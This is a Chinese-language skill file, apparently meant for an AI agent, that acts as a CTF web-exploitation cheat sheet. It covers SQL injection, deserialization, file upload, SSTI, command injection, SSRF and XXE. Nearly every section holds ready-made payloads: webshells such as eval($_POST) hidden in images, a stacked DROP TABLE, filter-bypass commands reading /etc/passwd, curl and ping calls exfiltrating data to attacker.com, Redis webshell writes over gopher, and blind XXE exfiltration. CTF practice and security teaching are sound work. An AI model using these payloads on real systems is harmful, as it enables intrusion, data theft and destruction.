---
name: ctf-web
description: CTF Web方向解题。触发：SQL注入、XSS、SSRF、文件上传、命令注入、PHP/JAVA反序列化、绕过技巧等场景。
---

# ctf-web — CTF Web方向解题

## 常见题型与解题思路

### 1. SQL 注入

**CTF 特性**：多为盲注 / 布尔注入 / 时间注入，极少有回显

**判断注入**
```sql
' OR IF(1=1,SLEEP(3),0)#
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100#
```

**SQLMap 盲注**
```bash
sqlmap -u "http://target/page.php?id=1" --batch --technique=B --level=3
sqlmap -u "http://target/page.php?id=1" --batch --technique=T --level=3
```

**MySQL 常用注入函数**
```sql
-- 布尔盲注判断
IF((ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97),SLEEP(3),0)

-- 报错注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))#
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),0)#

-- 堆叠注入
';DROP TABLE users;--

-- 二次注入（注册点写入，查询点触发）
username: admin'#
```

### 2. PHP 反序列化

**基础概念**
- `serialize()` / `unserialize()`
- 反序列化时会触发 `__wakeup()` / `__destruct()`

**Magic Methods**
```php
__construct()    // 对象创建时
__destruct()     // 对象销毁时
__wakeup()       // 反序列化时
__sleep()        // 序列化时
__toString()     // 字符串拼接时
__invoke()       // 当对象作为函数调用
__call()         // 调用不存在的方法
```

**绕过 __wakeup()**
```
O:4:"name":2:{...}  →  O:4:"name":1:{...}  (对象数改小)
```

**PHPGGTC 利用链**
- 寻找 POP 链：`__destruct()` → 可利用方法 → `__toString()` / `__call()`
- 常见 gadget：`system()` / `exec()` / `passthru()` / `eval()` / `assert()`

**session 反序列化**
```
PHP Session:    serialize() → a:1:{s:4:"user";s:5:"admin";}
PHPSerializer:  serialize() → user|s:5:"admin";
```

### 3. 文件上传

**CTF 常见绕过**
```
1. .phtml / .phar / .phpt / .php3 / .php5
2. 大小写：.PhP / .pHP
3. 空字节：shell.php%00.jpg（需找截断点）
4. 文件头伪装：GIF89a + <?php system($_GET['x']);?>
5. .htaccess：AddType application/x-httpd-php .jpg
6. .user.ini：auto_prepend_file=shell.png
7. 竞争上传：同时发多个请求
```

**图片马**
```bash
# copy 合并
copy /b image.jpg + shell.php shell.jpg

# exiftool
exiftool -Comment='<?php @eval($_POST[x]);?>' image.jpg
```

### 4. SSTI（服务端模板注入）

**Jinja2 (Python)**
```
{{7*7}}                    → 49（确认注入）
{{config}}                 → 泄露配置
{{''.__class__.__mro__[1].__subclasses__()}}  → 列类
{{lipsum.__globals__.__builtins__}} → 执行任意代码
```

**Twig (PHP)**
```
{{7*7}}      → 49
{{["id"]|map("system")}}
```

**绕过过滤**
```
{{gadget.__init__.__globals__}}  # 绕过 __class__
{{[].__class__.__bases__[0].__subclasses__()}}  # 绕过 _
```

### 5. 命令注入

**常见过滤绕过**
```bash
# 空格绕过
${IFS}
$IFS$9
< /etc/passwd
{cat,/etc/passwd}

# Base64 绕过
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`

# 引号绕过
w"h"o"am"i
```

**无回显命令注入**
```
# DNS外带
curl http://attacker.com/?a=$(whoami)
ping $(whoami).attacker.com

# 时间盲注
if [ $(whoami|cut -c1) == "r" ];then sleep 5;fi
```

### 6. SSRF

**伪协议**
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_%2A1%0D%0A$3%0D%0Ainfo%0D%0A
http://127.0.0.1:8080/admin
```

**Redis 写 WebShell（Gopher）**
```bash
gopher://127.0.0.1:6379/_
SET shell "<?php eval(\$_POST[1]);?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
```

### 7. Java 反序列化

**识别**
- Cookie / 参数中出现 `rO0AB`（Base64 encoded Java serialized object）
- `aced 0005`（Hex）

**工具**
```bash
java -jar ysoserial.jar CommonsCollections6 "whoami" > payload.ser
```

### 8. XXE

**读取文件**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

**Blind XXE 外带**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/?data=xxx">]>
%xxe;
```
